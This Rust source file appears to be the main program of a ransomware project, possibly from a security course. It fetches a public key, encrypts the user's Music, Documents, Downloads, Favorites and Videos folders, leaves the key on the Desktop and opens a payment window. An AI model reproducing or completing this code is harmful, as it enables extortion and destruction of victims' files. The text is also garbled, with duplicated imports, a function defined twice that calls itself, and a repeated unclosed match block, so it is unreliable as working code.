use std::fs;
use std::io::{self, Write};
use std::fs;
use std::io::{self, Write};
use std::path::PathBuf;

use anyhow::Result;

// use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
use c_monster_co_2ic80::cryptography::chunk::DEBUG_ENABLED;
use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
use c_monster_co_2ic80::debug_log;
use c_monster_co_2ic80::networking::client::gen_key;
use c_monster_co_2ic80::gui::payment::show_payment_window;
use c_monster_co_2ic80::gui::warning::show_warning_window;

use sodiumoxide::crypto::box_::PublicKey;
use sodiumoxide::crypto::box_::PublicKey;

use windows::{
    Win32::UI::Shell::{
        FOLDERID_Desktop, FOLDERID_Documents, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Downloads, FOLDERID_Favorites, KNOWN_FOLDER_FLAG,
        SHGetKnownFolderPath,
    },
    core::PWSTR,
};

fn desktop_file_path(filename: &str) -> Result<PathBuf> {
    unsafe {
        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), None)?;

        let desktop = path.to_string().unwrap();
        Ok(PathBuf::from(desktop).join(filename))
    }
}

// ENCRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    sodiumoxide::init().unwrap();

    let result = run_encryption().await;

    if DEBUG_ENABLED {
        println!("\nPress Enter to exit...");
        io::stdout().flush()?;
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
    }

    result
}

async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
    let result = run_encryption().await;

    if DEBUG_ENABLED {
        println!("\nPress Enter to exit...");
        io::stdout().flush()?;
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
    }

    result
}

async fn run_encryption() -> Result<(), Box<dyn std::error::Error>> {
    let pk: PublicKey = gen_key().await?;

    let paths = [
        FOLDERID_Music,
        FOLDERID_Documents,
        FOLDERID_Downloads,
        // FOLDERID_Desktop,
        FOLDERID_Favorites,
        FOLDERID_Videos,
        FOLDERID_Downloads,
    ];

    unsafe {
        for path in paths {
            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
            let path_str = path_ptr.to_string().unwrap();
            let path_buf: PathBuf = path_str.into();
            debug_log!("path: {:?}", path_buf);
            debug_log!("path: {:?}", path_buf);

            // match encrypt_folder(&path_buf, &pk) {
            match encrypt_folder_parallel(&path_buf, &pk, None).await {
                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path),
                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path, e),
            // match encrypt_folder(&path_buf, &pk) {
            match encrypt_folder_parallel(&path_buf, &pk, None).await {
                Ok(_) => debug_log!("✓ Successfully encrypted: {:?}", path),
                Err(e) => debug_log!("✗ Error encrypting {:?}: {}", path, e),
            }

            let out_path = desktop_file_path("public_key.donotdelete")?;
            fs::write(out_path, &pk)?;
        }
    }

    // Show payment window after encryption
    println!("Encryption complete! Opening payment window...");
    show_payment_window(Some(pk));

    Ok(())
}
